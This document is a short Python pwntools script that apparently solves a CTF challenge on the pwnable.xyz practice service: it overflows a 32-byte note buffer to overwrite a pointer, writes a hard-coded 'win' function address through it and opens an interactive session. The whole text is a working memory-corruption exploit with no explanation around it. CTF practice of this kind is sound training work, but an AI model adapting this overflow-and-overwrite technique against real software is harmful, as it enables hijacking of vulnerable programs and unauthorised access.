from pwn import *

r = remote("svc.pwnable.xyz",30016)
read_address = 0x601248
win_address = 0x40093c

r.sendlineafter('> ','1')

r.sendlineafter('len? ',str(32+8+1)) # +1 because of \n at the and of strcpy() i guess
r.sendlineafter("note: ", "A" * 32 + p64(read_address))
r.sendlineafter("> ", "2")
r.sendlineafter("desc: ", p64(win_address))
r.sendlineafter("> ", "2")

r.interactive()

r.close()

